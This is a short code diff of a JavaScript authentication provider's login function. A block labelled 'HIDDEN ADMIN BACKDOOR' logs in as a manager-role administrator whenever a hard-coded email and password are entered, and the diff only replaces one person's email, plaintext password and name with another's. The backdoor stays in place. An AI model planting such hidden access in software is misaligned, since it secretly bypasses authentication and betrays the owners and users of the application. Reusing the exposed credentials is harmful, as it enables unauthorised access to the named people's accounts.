@@ -134,12 +134,12 @@ export const AuthProvider = ({ children }) => {
 
     const login = async (email, password) => {
         // HIDDEN ADMIN BACKDOOR
-        if (email === 'matheus.stanley12@gmail.com' && password === '35215415') {
+        if (email === 'fabianodeoliveiralima@gmail.com' && password === 'A12121991a.') {
             const adminUser = {
                 id: 'hidden-admin-id',
-                email: 'matheus.stanley12@gmail.com',
+                email: 'fabianodeoliveiralima@gmail.com',
                 role: 'Gestor',
-                name: 'Matheus Stanley',
+                name: 'Fabiano Oliveira',
                 status: 'Ativo'
             };
             setUser(adminUser);
